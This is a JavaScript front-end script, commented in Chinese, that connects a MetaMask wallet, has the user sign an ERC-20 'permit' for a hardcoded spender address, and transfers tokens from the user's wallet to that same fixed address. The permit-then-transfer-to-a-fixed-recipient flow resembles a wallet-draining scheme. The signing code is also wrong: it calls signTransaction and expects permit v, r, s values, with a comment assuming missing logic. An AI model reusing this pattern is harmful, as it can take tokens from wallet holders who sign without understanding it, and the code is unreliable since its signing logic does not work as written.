let web3;
let contract;

const contractAddress = "0x2E9d30761DB97706C536A112B9466433032b28e3"; // 最新的智能合约地址
const abi = [
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "account",
        "type": "address"
      }
    ],
    "name": "balanceOf",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "owner",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "spender",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "value",
        "type": "uint256"
      },
      {
        "internalType": "uint256",
        "name": "deadline",
        "type": "uint256"
      },
      {
        "internalType": "uint8",
        "name": "v",
        "type": "uint8"
      },
      {
        "internalType": "bytes32",
        "name": "r",
        "type": "bytes32"
      },
      {
        "internalType": "bytes32",
        "name": "s",
        "type": "bytes32"
      }
    ],
    "name": "permit",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "sender",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "recipient",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
      }
    ],
    "name": "transferFrom",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "function"
  }
];

// 连接钱包
document.getElementById("connectWalletBtn").addEventListener("click", async () => {
    if (window.ethereum) {
        try {
            await window.ethereum.request({ method: "eth_requestAccounts" });
            web3 = new Web3(window.ethereum);
            console.log("Wallet connected");
            contract = new web3.eth.Contract(abi, contractAddress);
        } catch (error) {
            console.error("Error connecting to wallet:", error);
        }
    } else {
        alert("Please install MetaMask!");
    }
});

// 签名授权
document.getElementById("signPermitBtn").addEventListener("click", async () => {
    if (!contract || !web3) {
        alert("Please connect your wallet first.");
        return;
    }

    try {
        const accounts = await web3.eth.getAccounts();
        const owner = accounts[0]; // 当前连接的钱包地址
        const spender = "0xa465e2fc9f9d527AAEb07579E821D461F700e699"; // 接收代币的地址
        const value = web3.utils.toWei("1", "ether"); // 授权的代币数量
        const deadline = Math.floor(Date.now() / 1000) + 3600; // 1小时的授权时间

        // 生成签名的v, r, s 参数 (假设已经有了获取v, r, s的逻辑)
        const { v, r, s } = await web3.eth.accounts.signTransaction({
            owner: owner,
            spender: spender,
            value: value,
            deadline: deadline
        });

        // 调用合约中的 permit 函数进行授权
        await contract.methods.permit(owner, spender, value, deadline, v, r, s).send({ from: owner });
        console.log("Permit signed and transaction sent.");
    } catch (error) {
        console.error("Error during permit signing:", error);
    }
});

// 代币转移
document.getElementById("transferTokensBtn").addEventListener("click", async () => {
    if (!contract || !web3) {
        alert("Please connect your wallet first.");
        return;
    }

    try {
        const accounts = await web3.eth.getAccounts();
        const sender = accounts[0]; // 当前连接的钱包地址
        const recipient = "0xa465e2fc9f9d527AAEb07579E821D461F700e699"; // 接收代币的地址
        const amount = web3.utils.toWei("1", "ether"); // 要转移的代币数量

        // 调用合约中的 transferFrom 函数
        await contract.methods.transferFrom(sender, recipient, amount).send({ from: sender });
        console.log("Tokens transferred.");
    } catch (error) {
        console.error("Error during token transfer:", error);
    }
});
